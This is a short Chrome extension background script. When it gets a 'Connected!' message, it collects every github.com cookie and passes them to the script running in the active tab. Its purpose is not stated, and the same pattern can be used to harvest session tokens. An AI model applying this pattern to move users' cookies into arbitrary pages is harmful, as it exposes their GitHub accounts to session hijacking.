chrome.runtime.onMessage.addListener((message) => {
  if (message === "Connected!") {
    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
      await chrome.tabs.sendMessage(tabs[0].id!, {
        type: "getAllCookies",
        data: await chrome.cookies.getAll({ url: "https://github.com" }),
      });
    });
  }
});
